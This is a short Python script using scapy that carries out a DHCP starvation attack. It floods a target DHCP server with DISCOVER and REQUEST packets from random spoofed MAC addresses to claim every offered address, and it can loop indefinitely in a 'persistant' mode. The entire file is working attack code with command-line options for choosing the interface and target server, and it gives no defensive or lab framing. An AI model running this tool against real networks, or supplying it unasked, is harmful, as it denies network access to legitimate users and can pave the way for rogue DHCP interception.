import subprocess
import optparse
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import UDP, IP
from scapy.layers.l2 import Ether



def send_dhcp_request(packet):
    if (packet[DHCP].options[0][1]==2):
        ip_offered = packet[BOOTP].yiaddr
        dst_mac = "ff:ff:ff:ff:ff:ff"
        src_mac = get_if_hwaddr(conf.iface)
        spoofed_mac = RandMAC()
        options = [("message-type", "request"),
               ("requested_addr", ip_offered),
              ("end","0")]
        transaction_id = random.randint(1, 900000000)
        dhcp_request = Ether(src=src_mac,dst=dst_mac)\
                    /IP(src="0.0.0.0",dst=target)\
                    /UDP(sport=68,dport=67)\
                    /BOOTP(chaddr=[mac2str(spoofed_mac)],
                                   xid=transaction_id,
                                   flags=0xFFFFFF)\
                    /DHCP(options=options)
        sendp(dhcp_request,
          iface=interface)





def send_dhcp_discover(interface, target):
    dst_mac = "ff:ff:ff:ff:ff:ff"
    src_mac = get_if_hwaddr(conf.iface)
    spoofed_mac = RandMAC()
    options = [("message-type", "discover"),
               ("max_dhcp_size",1500),
               ("client_id", mac2str(spoofed_mac)),
               ("lease_time",10000),
               ("end","0")]
    transaction_id = random.randint(1, 900000000)
    dhcp_request = Ether(src=src_mac,dst=dst_mac)\
                    /IP(src="0.0.0.0",dst=target)\
                    /UDP(sport=68,dport=67)\
                    /BOOTP(chaddr=[mac2str(spoofed_mac)],
                                   xid=transaction_id,
                                   flags=0xFFFFFF)\
                    /DHCP(options=options)
    sendp(dhcp_request,
          iface=interface)


if __name__=="__main__":
    parser = optparse.OptionParser()

    parser.add_option("-i", "--iface", dest="interface", help="Interface you wish to use")
    parser.add_option("-t", "--target", dest="target", help="IP of target server")
    parser.add_option("-p", "--persistant", dest="persistance", help="persistant?",default=False, action='store_true')


    (options, arguments) = parser.parse_args()

    interface = options.interface
    target = options.target
    persistant = options.persistance


    if(persistant == False):
        count = 0;
        while(count<50):
            send_dhcp_discover(interface, target)
            sniffed = sniff(iface=interface, filter="port 68 and port 67", prn=send_dhcp_request, count=1)
            count+=1;

    else:
        while (True):
            send_dhcp_discover(interface, target)
            sniffed = sniff(iface=interface, filter="port 68 and port 67", prn=send_dhcp_request, count=1)